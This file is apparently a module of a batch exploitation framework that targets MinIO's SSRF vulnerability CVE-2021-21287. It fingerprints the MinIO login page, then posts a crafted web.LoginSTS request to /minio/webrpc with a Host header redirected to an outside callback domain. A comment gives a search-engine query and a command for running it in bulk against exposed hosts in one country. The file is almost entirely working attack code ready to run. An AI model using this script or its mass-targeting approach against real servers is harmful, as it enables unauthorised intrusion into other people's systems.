# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 14:08

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: "minio" && country="CN"
# python3 batch.py -m exploit.scripts.Minio.CVE-2021-21287 -cs -fs "\"minio\" && country=\"CN\""

class Script(BaseScript):
    name = 'Minio'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.SSRF
        # 编号
        self.bug_number = 'CVE-2021-21287'
        # 来源
        self.bug_refer = 'https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html'
        # 特定路径判断
        self.detect_path_list = ['/minio/login']
        # exec
        self.exec_path_list = ['/minio/webrpc']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout, allow_redirects=False)
                if '<title>Minio Browser</title>' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/json', 'Host': 'minio.9999.eyes.sh'})
        async with aiohttp.ClientSession() as session:
            for execPath in self.exec_path_list:
                url = f'http://{self.target}{execPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = '''{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}'''
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if text is not None and 'We encountered an internal error' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}

if __name__ == '__main__':
    pass